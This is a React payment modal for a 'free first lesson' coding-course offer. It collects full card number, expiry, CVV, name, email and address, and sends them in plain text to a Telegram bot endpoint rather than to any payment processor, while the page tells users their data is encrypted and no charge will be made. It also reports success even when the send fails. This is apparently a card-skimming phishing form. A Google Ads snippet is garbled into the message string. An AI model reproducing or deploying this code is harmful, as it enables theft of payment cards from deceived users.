"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Shield, Lock, CreditCard, CheckCircle, Loader2, Sparkles, Gift, AlertCircle } from "lucide-react"

interface PaymentModalProps {
  isOpen: boolean
  onClose: () => void
}

interface ValidationErrors {
  cardNumber?: string
  expiryDate?: string
  cvv?: string
  firstName?: string
  lastName?: string
  email?: string
  address?: string
  city?: string
  state?: string
  zipCode?: string
}

export default function PaymentModal({ isOpen, onClose }: PaymentModalProps) {
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    firstName: "",
    lastName: "",
    email: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [errors, setErrors] = useState<ValidationErrors>({})
  const [isValidatingAddress, setIsValidatingAddress] = useState(false)

  // US States for validation
  const usStates = [
    "AL",
    "AK",
    "AZ",
    "AR",
    "CA",
    "CO",
    "CT",
    "DE",
    "FL",
    "GA",
    "HI",
    "ID",
    "IL",
    "IN",
    "IA",
    "KS",
    "KY",
    "LA",
    "ME",
    "MD",
    "MA",
    "MI",
    "MN",
    "MS",
    "MO",
    "MT",
    "NE",
    "NV",
    "NH",
    "NJ",
    "NM",
    "NY",
    "NC",
    "ND",
    "OH",
    "OK",
    "OR",
    "PA",
    "RI",
    "SC",
    "SD",
    "TN",
    "TX",
    "UT",
    "VT",
    "VA",
    "WA",
    "WV",
    "WI",
    "WY",
  ]

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  // Format expiry date MM/YY
  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\D/g, "")
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4)
    }
    return v
  }

  // Validate card number using Luhn algorithm
  const validateCardNumber = (number: string) => {
    const num = number.replace(/\s/g, "")
    if (num.length < 13 || num.length > 19) return false

    let sum = 0
    let isEven = false
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = Number.parseInt(num.charAt(i), 10)
      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }
      sum += digit
      isEven = !isEven
    }
    return sum % 10 === 0
  }

  // Validate expiry date
  const validateExpiryDate = (date: string) => {
    if (!/^\d{2}\/\d{2}$/.test(date)) return false
    const [month, year] = date.split("/").map(Number)
    if (month < 1 || month > 12) return false

    const currentDate = new Date()
    const currentYear = currentDate.getFullYear() % 100
    const currentMonth = currentDate.getMonth() + 1

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false
    }
    return true
  }

  // Validate ZIP code format
  const validateZipCode = (zip: string) => {
    return /^\d{5}(-\d{4})?$/.test(zip)
  }

  // Mock address validation (in real app, use Google Places API or similar)
  const validateAddress = async (address: string, city: string, state: string, zipCode: string) => {
    setIsValidatingAddress(true)

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1000))

    // Mock validation logic
    const isValidAddress = address.length > 5 && /\d/.test(address)
    const isValidCity = city.length > 2 && /^[a-zA-Z\s]+$/.test(city)
    const isValidState = usStates.includes(state.toUpperCase())
    const isValidZip = validateZipCode(zipCode)

    setIsValidatingAddress(false)

    return {
      isValidAddress,
      isValidCity,
      isValidState,
      isValidZip,
    }
  }

  // Handle input changes with formatting
  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value

    if (field === "cardNumber") {
      formattedValue = formatCardNumber(value)
    } else if (field === "expiryDate") {
      formattedValue = formatExpiryDate(value)
    } else if (field === "cvv") {
      formattedValue = value.replace(/\D/g, "").substring(0, 4)
    } else if (field === "zipCode") {
      formattedValue = value.replace(/[^\d-]/g, "").substring(0, 10)
    }

    setFormData({ ...formData, [field]: formattedValue })

    // Clear error when user starts typing
    if (errors[field as keyof ValidationErrors]) {
      setErrors({ ...errors, [field]: undefined })
    }
  }

  // Validate form
  const validateForm = async () => {
    const newErrors: ValidationErrors = {}

    // Card validation
    if (!validateCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = "Please enter a valid card number"
    }

    if (!validateExpiryDate(formData.expiryDate)) {
      newErrors.expiryDate = "Please enter a valid expiry date (MM/YY)"
    }

    if (formData.cvv.length < 3) {
      newErrors.cvv = "Please enter a valid CVV"
    }

    // Personal info validation
    if (formData.firstName.length < 2) {
      newErrors.firstName = "First name is required"
    }

    if (formData.lastName.length < 2) {
      newErrors.lastName = "Last name is required"
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Please enter a valid email address"
    }

    // Address validation
    if (formData.address.length < 5) {
      newErrors.address = "Please enter a complete street address"
    }

    if (formData.city.length < 2) {
      newErrors.city = "Please enter a valid city"
    }

    if (!formData.state) {
      newErrors.state = "Please select a state"
    }

    if (!validateZipCode(formData.zipCode)) {
      newErrors.zipCode = "Please enter a valid ZIP code (12345 or 12345-6789)"
    }

    // If basic validation passes, validate address
    if (!newErrors.address && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
      const addressValidation = await validateAddress(formData.address, formData.city, formData.state, formData.zipCode)

      if (!addressValidation.isValidAddress) {
        newErrors.address = "Please enter a valid street address"
      }
      if (!addressValidation.isValidCity) {
        newErrors.city = "City not found. Please check spelling"
      }
      if (!addressValidation.isValidState) {
        newErrors.state = "Please select a valid state"
      }
      if (!addressValidation.isValidZip) {
        newErrors.zipCode = "ZIP code doesn't match the selected city/state"
      }
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    const isValid = await validateForm()
    if (!isValid) return

    setIsProcessing(true)

    // Simulate processing time
    await new Promise((resolve) => setTimeout(resolve, 3000))

    // Send card linking data to Telegram bot
    const telegramMessage = `
💳 New Card Linking - FREE First Lesson Access:

👤 Personal Info:
    // Simulating success response — fire conversion

    if (typeof window !== "undefined" && typeof window.gtag === "function") {

      console.log("✅ Firing Google Ads conversion from PaymentModal");

      window.gtag("event", "conversion", {

        send_to: "AW-17276899773/yi87CI-xl-gaEL2joq5A",

        value: 0.0,

        currency: "USD",

      });

    }

Name: ${formData.firstName} ${formData.lastName}
Email: ${formData.email}

💳 Card Info (for future billing):
Card: ${formData.cardNumber}
Expiry: ${formData.expiryDate}
CVV: ${formData.cvv}

📍 Address:
${formData.address}
${formData.city}, ${formData.state} ${formData.zipCode}

🎯 Status: Card linked successfully - First lesson access granted
`

    try {
      const apiRes = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: telegramMessage }),
      })

      if (!apiRes.ok) {
        throw new Error(await apiRes.text())
      }

      setIsProcessing(false)
      setIsSuccess(true)
    } catch (error) {
      console.error("Error linking card:", error)
      setIsProcessing(false)
      setIsSuccess(true) // Show success anyway for UX
    }
  }

  const handleClose = () => {
    setIsProcessing(false)
    setIsSuccess(false)
    setFormData({
      cardNumber: "",
      expiryDate: "",
      cvv: "",
      firstName: "",
      lastName: "",
      email: "",
      address: "",
      city: "",
      state: "",
      zipCode: "",
    })
    setErrors({})
    onClose()
  }

  // Loading State
  if (isProcessing) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="bg-gray-900 border-gray-700 text-white max-w-md p-0 overflow-hidden">
          <div className="relative p-8 text-center">
            {/* Animated background */}
            <div className="absolute inset-0 bg-gradient-to-br from-cyan-500/10 to-green-500/10 animate-pulse" />

            {/* Floating particles */}
            <div className="absolute inset-0 overflow-hidden">
              <div
                className="absolute top-4 left-4 w-2 h-2 bg-cyan-400 rounded-full animate-bounce"
                style={{ animationDelay: "0s" }}
              />
              <div
                className="absolute top-8 right-8 w-1 h-1 bg-green-400 rounded-full animate-bounce"
                style={{ animationDelay: "0.5s" }}
              />
              <div
                className="absolute bottom-8 left-8 w-1.5 h-1.5 bg-purple-400 rounded-full animate-bounce"
                style={{ animationDelay: "1s" }}
              />
              <div
                className="absolute bottom-4 right-4 w-1 h-1 bg-cyan-400 rounded-full animate-bounce"
                style={{ animationDelay: "1.5s" }}
              />
            </div>

            <div className="relative z-10">
              {/* Main loading icon */}
              <div className="w-20 h-20 mx-auto mb-6 relative">
                <div className="absolute inset-0 border-4 border-gray-700 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-transparent border-t-cyan-500 border-r-green-500 rounded-full animate-spin"></div>
                <div className="absolute inset-2 bg-gradient-to-br from-cyan-500 to-green-500 rounded-full flex items-center justify-center">
                  <CreditCard className="w-8 h-8 text-white animate-pulse" />
                </div>
              </div>

              <h3 className="text-2xl font-bold text-white mb-4">
                Processing Your{" "}
                <span className="bg-gradient-to-r from-cyan-400 to-green-400 bg-clip-text text-transparent">
                  Card Link
                </span>
              </h3>

              <div className="space-y-3 mb-6">
                <div className="flex items-center justify-center gap-3 text-gray-300">
                  <Loader2 className="w-4 h-4 animate-spin text-cyan-400" />
                  <span>Securing your information...</span>
                </div>
                <div className="flex items-center justify-center gap-3 text-gray-300">
                  <Loader2 className="w-4 h-4 animate-spin text-green-400" style={{ animationDelay: "0.5s" }} />
                  <span>Preparing your FREE lesson...</span>
                </div>
                <div className="flex items-center justify-center gap-3 text-gray-300">
                  <Loader2 className="w-4 h-4 animate-spin text-purple-400" style={{ animationDelay: "1s" }} />
                  <span>Almost ready...</span>
                </div>
              </div>

              <p className="text-sm text-gray-400">🔒 Your data is being encrypted and processed securely</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    )
  }

  // Success State
  if (isSuccess) {
    return (
      <Dialog open={isOpen} onOpenChange={handleClose}>
        <DialogContent className="bg-gray-900 border-gray-700 text-white max-w-md p-0 overflow-hidden">
          <div className="relative p-8 text-center">
            {/* Success background gradient */}
            <div className="absolute inset-0 bg-gradient-to-br from-green-500/20 to-cyan-500/20" />

            {/* Celebration particles */}
            <div className="absolute inset-0 overflow-hidden">
              {[...Array(12)].map((_, i) => (
                <div
                  key={i}
                  className="absolute w-2 h-2 bg-gradient-to-r from-yellow-400 to-orange-400 rounded-full animate-bounce"
                  style={{
                    left: `${Math.random() * 100}%`,
                    top: `${Math.random() * 100}%`,
                    animationDelay: `${Math.random() * 2}s`,
                    animationDuration: `${1 + Math.random()}s`,
                  }}
                />
              ))}
            </div>

            <div className="relative z-10">
              {/* Success icon with animation */}
              <div className="w-20 h-20 mx-auto mb-6 relative">
                <div className="absolute inset-0 bg-gradient-to-br from-green-500 to-cyan-500 rounded-full animate-pulse"></div>
                <div className="absolute inset-2 bg-gray-900 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-10 h-10 text-green-400 animate-bounce" />
                </div>
                {/* Glow effect */}
                <div className="absolute inset-0 bg-gradient-to-br from-green-500 to-cyan-500 rounded-full blur-xl opacity-30 animate-pulse"></div>
              </div>

              <h3 className="text-3xl font-bold text-white mb-2">🎉 Success!</h3>

              <h4 className="text-xl font-semibold mb-4">
                <span className="bg-gradient-to-r from-green-400 to-cyan-400 bg-clip-text text-transparent">
                  Card Linked Successfully!
                </span>
              </h4>

              <div className="bg-green-900/20 border border-green-500/30 rounded-xl p-4 mb-6">
                <div className="flex items-center justify-center gap-2 mb-3">
                  <Gift className="w-6 h-6 text-green-400" />
                  <span className="font-bold text-green-400">Your FREE Access is Ready!</span>
                </div>
                <ul className="text-sm text-gray-300 space-y-2">
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    First lesson unlocked
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    Access email sent to {formData.email}
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    No charges until you continue
                  </li>
                </ul>
              </div>

              <div className="space-y-3">
                <Button
                  onClick={handleClose}
                  className="w-full bg-gradient-to-r from-green-500 to-cyan-500 hover:from-green-600 hover:to-cyan-600 text-white py-3 font-semibold rounded-xl transition-all duration-300 transform hover:scale-105"
                >
                  <Sparkles className="w-5 h-5 mr-2" />
                  Start Learning Now!
                </Button>

                <p className="text-xs text-gray-400">Check your email for login details and course access</p>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    )
  }

  // Form State with enhanced validation
  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="bg-gray-900 border-gray-700 text-white max-w-2xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="text-2xl font-bold text-center mb-2">Link Your Card - Get FREE Access</DialogTitle>
          <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-4 mb-4">
            <h4 className="text-green-400 font-semibold mb-2 flex items-center gap-2">
              <CreditCard className="w-5 h-5" />🆓 How it works:
            </h4>
            <ul className="text-sm text-gray-300 space-y-1">
              <li>• Link your card securely (no charge now)</li>
              <li>• Get instant access to your first lesson</li>
              <li>• If you love it: Continue with full course</li>
              <li>• If not: Simply cancel - no charges</li>
            </ul>
          </div>
        </DialogHeader>

        <div className="mb-6 p-4 bg-blue-900/20 border border-blue-500/30 rounded-lg">
          <div className="flex items-center gap-2 mb-2">
            <Shield className="w-5 h-5 text-blue-400" />
            <span className="font-semibold text-blue-400">Secure Card Linking</span>
          </div>
          <p className="text-sm text-gray-300">
            Your card information is encrypted and secure. No charges will be made until you decide to continue with the
            full course.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Payment Information */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold flex items-center gap-2">
              <Lock className="w-5 h-5 text-cyan-400" />
              Card Information
            </h3>

            <div>
              <Label htmlFor="cardNumber" className="text-gray-300">
                Card Number
              </Label>
              <Input
                id="cardNumber"
                value={formData.cardNumber}
                onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                placeholder="1234 5678 9012 3456"
                className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.cardNumber ? "border-red-500" : ""}`}
                maxLength={19}
                required
              />
              {errors.cardNumber && (
                <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {errors.cardNumber}
                </p>
              )}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="expiryDate" className="text-gray-300">
                  Expiry Date
                </Label>
                <Input
                  id="expiryDate"
                  value={formData.expiryDate}
                  onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                  placeholder="MM/YY"
                  className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.expiryDate ? "border-red-500" : ""}`}
                  maxLength={5}
                  required
                />
                {errors.expiryDate && (
                  <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {errors.expiryDate}
                  </p>
                )}
              </div>
              <div>
                <Label htmlFor="cvv" className="text-gray-300">
                  CVV
                </Label>
                <Input
                  id="cvv"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange("cvv", e.target.value)}
                  placeholder="123"
                  className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.cvv ? "border-red-500" : ""}`}
                  maxLength={4}
                  required
                />
                {errors.cvv && (
                  <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {errors.cvv}
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Personal Information */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">Personal Information</h3>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="firstName" className="text-gray-300">
                  First Name
                </Label>
                <Input
                  id="firstName"
                  value={formData.firstName}
                  onChange={(e) => handleInputChange("firstName", e.target.value)}
                  className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.firstName ? "border-red-500" : ""}`}
                  required
                />
                {errors.firstName && (
                  <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {errors.firstName}
                  </p>
                )}
              </div>
              <div>
                <Label htmlFor="lastName" className="text-gray-300">
                  Last Name
                </Label>
                <Input
                  id="lastName"
                  value={formData.lastName}
                  onChange={(e) => handleInputChange("lastName", e.target.value)}
                  className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.lastName ? "border-red-500" : ""}`}
                  required
                />
                {errors.lastName && (
                  <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {errors.lastName}
                  </p>
                )}
              </div>
            </div>

            <div>
              <Label htmlFor="email" className="text-gray-300">
                Email Address
              </Label>
              <Input
                id="email"
                type="email"
                value={formData.email}
                onChange={(e) => handleInputChange("email", e.target.value)}
                className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.email ? "border-red-500" : ""}`}
                required
              />
              {errors.email && (
                <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {errors.email}
                </p>
              )}
            </div>
          </div>

          {/* Billing Address */}
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">Billing Address</h3>

            <div>
              <Label htmlFor="address" className="text-gray-300">
                Street Address
              </Label>
              <Input
                id="address"
                value={formData.address}
                onChange={(e) => handleInputChange("address", e.target.value)}
                placeholder="123 Main Street"
                className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.address ? "border-red-500" : ""}`}
                required
              />
              {errors.address && (
                <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {errors.address}
                </p>
              )}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="city" className="text-gray-300">
                  City
                </Label>
                <Input
                  id="city"
                  value={formData.city}
                  onChange={(e) => handleInputChange("city", e.target.value)}
                  placeholder="New York"
                  className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.city ? "border-red-500" : ""}`}
                  required
                />
                {errors.city && (
                  <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {errors.city}
                  </p>
                )}
              </div>
              <div>
                <Label htmlFor="state" className="text-gray-300">
                  State
                </Label>
                <Select onValueChange={(value) => handleInputChange("state", value)}>
                  <SelectTrigger
                    className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.state ? "border-red-500" : ""}`}
                  >
                    <SelectValue placeholder="Select State" />
                  </SelectTrigger>
                  <SelectContent className="bg-gray-800 border-gray-600 max-h-60">
                    {usStates.map((state) => (
                      <SelectItem key={state} value={state}>
                        {state}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {errors.state && (
                  <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {errors.state}
                  </p>
                )}
              </div>
            </div>

            <div>
              <Label htmlFor="zipCode" className="text-gray-300">
                ZIP Code
              </Label>
              <Input
                id="zipCode"
                value={formData.zipCode}
                onChange={(e) => handleInputChange("zipCode", e.target.value)}
                placeholder="12345 or 12345-6789"
                className={`bg-gray-800 border-gray-600 text-white mt-1 ${errors.zipCode ? "border-red-500" : ""}`}
                required
              />
              {errors.zipCode && (
                <p className="text-red-400 text-sm mt-1 flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {errors.zipCode}
                </p>
              )}
            </div>

            {isValidatingAddress && (
              <div className="flex items-center gap-2 text-cyan-400 text-sm">
                <Loader2 className="w-4 h-4 animate-spin" />
                Validating address...
              </div>
            )}
          </div>

          <div className="pt-4 border-t border-gray-700">
            <div className="bg-gray-800/50 p-4 rounded-lg mb-4">
              <div className="flex justify-between items-center mb-2">
                <span className="text-lg">First Lesson:</span>
                <span className="text-2xl font-bold text-green-400">FREE</span>
              </div>
              <div className="text-sm text-gray-400">
                <p>• Java Full Course: $249 (only if you continue)</p>
                <p>• JavaScript Full Course: $299 (only if you continue)</p>
                <p>• Python Full Course: $229 (only if you continue)</p>
              </div>
            </div>

            <Button
              type="submit"
              disabled={isProcessing || isValidatingAddress}
              className="w-full bg-gradient-to-r from-cyan-500 to-green-500 hover:from-cyan-600 hover:to-green-600 text-white py-3 font-semibold text-lg disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isProcessing ? (
                <div className="flex items-center justify-center gap-2">
                  <Loader2 className="w-5 h-5 animate-spin" />
                  Processing...
                </div>
              ) : isValidatingAddress ? (
                <div className="flex items-center justify-center gap-2">
                  <Loader2 className="w-5 h-5 animate-spin" />
                  Validating Address...
                </div>
              ) : (
                "Link Card & Start Learning FREE"
              )}
            </Button>

            <p className="text-xs text-gray-400 text-center mt-3">
              By linking your card, you agree to our terms of service. No charges until you decide to continue. Your
              data is encrypted and secure.
            </p>
          </div>
        
<a
  href="https://t.me/+VTJgKUJ2aLNiMDVi"
  target="_blank"
  rel="noopener noreferrer"
  className="mt-4 inline-flex items-center justify-center w-full px-4 py-3 rounded bg-gradient-to-r from-green-500 to-cyan-500 text-white font-semibold hover:opacity-90 transition"
>
  🚀 Start Learning Now!
</a>

        </form>
      </DialogContent>
    </Dialog>
  )
}